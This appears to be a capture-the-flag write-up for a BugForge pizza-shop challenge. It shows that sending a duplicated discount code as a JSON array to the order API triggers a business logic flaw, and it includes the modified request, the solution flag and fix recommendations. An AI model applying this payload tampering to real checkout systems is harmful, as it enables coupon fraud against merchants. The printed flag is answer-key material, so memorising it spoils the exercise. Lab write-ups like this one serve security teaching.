# Cheesy Does It — cheesy-005 — Can apply the discount multiple times?

## Challenge Overview

- **Platform:** BugForge
- **Challenge:** Cheesy Does It
- **Category:** Web Application Security
- **Vulnerability:** Business Logic Flaw — Duplicate Discount Application
- **Difficulty:** Easy
- **Status:** Solved

### Challenge Hint

> Can apply the discount multiple times?

The challenge involves investigating a pizza ordering application to determine whether the same discount code can be submitted multiple times in a single order request.

---

## 1. Initial Reconnaissance

After registering a test user and accessing the checkout page, the application displayed the following promotional banner:

```text
Use the discount code PIZZA-10 for a 10% discount today only!
```

The checkout process submitted orders through this API endpoint:

```http
POST /api/orders
```

The application accepted JSON requests containing pizza details, delivery information, payment method, and a discount field.

## 2. Analyze the Original Request

The initial order request included the discount code as a single string.

**Endpoint:**

```http
POST /api/orders
Content-Type: application/json
```

**Relevant request payload:**

```json
{
  "items": [
    {
      "pizza_name": "Classic Margherita",
      "base_name": "Thin Crust",
      "sauce_name": "Classic Tomato",
      "size": "Medium",
      "toppings": [
        "Tomatoes",
        "Extra Mozzarella"
      ],
      "quantity": 1,
      "unit_price": 10.99,
      "total_price": 10.99,
      "id": 1792339802680
    }
  ],
  "delivery_address": "qwertyuiop,lkjhgfdsa,zxcvbnm",
  "phone": "1234567890",
  "payment_method": "card",
  "notes": "",
  "discount": "PIZZA-10"
}
```

The server returned a successful response:

```json
{
  "id": 10,
  "order_number": "CDI-1792339838770-QU7XHSZ7A",
  "message": "Order created successfully",
  "status": "received"
}
```

The initial request established that the application accepted the coupon in its normal string format.

## 3. Identify the Attack Surface

The `discount` field was a suitable target for further testing because the challenge hint explicitly referred to applying a discount multiple times.

The objective was to determine whether the server correctly enforced the expected discount rules when the request contained duplicate coupon codes.

## 4. Exploitation

Using the browser's Developer Tools and the Network panel, the order request was inspected and its JSON payload modified.

The original field was:

```json
"discount": "PIZZA-10"
```

It was changed to an array containing the same coupon twice:

```json
"discount": [
  "PIZZA-10",
  "PIZZA-10"
]
```

The modified request was submitted to the same endpoint:

```http
POST /api/orders
```

The remaining order fields were retained.

### Successful Response

The server returned HTTP `200 OK` with the following JSON response:

```json
{
  "id": 17,
  "order_number": "CDI-1792340511410-VHGTI6ZAI",
  "message": "Order created successfully",
  "status": "received",
  "flag": "bug{5kWODwO2lVfQlUg4k2mLdBDYJFUsSjV6}"
}
```

The presence of the `flag` field confirmed that the modified request triggered the intended challenge condition.

## 5. Flag

```text
bug{5kWODwO2lVfQlUg4k2mLdBDYJFUsSjV6}
```

## 6. Vulnerability Analysis

The challenge demonstrates a business logic issue involving duplicate discount submission.

The backend accepted a request in which the discount field was an array containing two copies of the same coupon code. This behavior was sufficient to trigger the challenge's success condition.

The observed behavior suggests insufficient enforcement of the intended coupon-processing rules or insufficient validation of the discount field's structure.

**Important distinction:** The successful response proves that the modified payload triggered the challenge. The captured requests alone do not establish whether the application actually deducted the discount twice from the final order total or which specific backend validation check was missing.

### Root Cause to Investigate

Potential underlying weaknesses include:

- Accepting unexpected data types for the discount field.
- Failing to reject duplicate coupon codes.
- Not enforcing coupon usage and application limits on the server.
- Processing user-controlled discount data without strict validation.

## 7. Security Recommendations

To prevent this class of vulnerability:

1. **Validate input types:** Require the discount field to match the expected schema, such as a single string when only one coupon is permitted.
2. **Reject duplicate coupons:** Detect and reject repeated coupon codes when duplicates are not allowed.
3. **Enforce business rules server-side:** Validate coupon eligibility, expiration, usage limits, and application rules independently of the frontend.
4. **Calculate prices on the server:** Derive prices and discounts from trusted product data instead of relying on client-supplied totals.
5. **Use atomic discount processing:** Ensure coupon usage and order calculations cannot be manipulated through repeated or concurrent requests.
6. **Add regression tests:** Test single coupon submissions, duplicate coupons, malformed field types, expired coupons, and invalid codes.

## 8. Lessons Learned

- Business logic vulnerabilities can exist even when an application uses a normal, authenticated checkout workflow.
- JSON field types can be important attack surfaces during API testing.
- Changing a field from a string to an array can reveal inadequate server-side validation.
- The server's response should be inspected to confirm whether a test triggered the expected challenge condition.
- A successful exploit should be documented with both the original and modified requests.

## Conclusion

The **Cheesy Does It** challenge was solved by inspecting the order creation API and changing the `discount` field from a single coupon string to an array containing the same coupon twice.

The application accepted the modified request and returned the challenge flag, demonstrating a weakness in the handling of repeated discount input.

This exercise highlights the importance of strict server-side input validation and correct enforcement of business logic in web applications.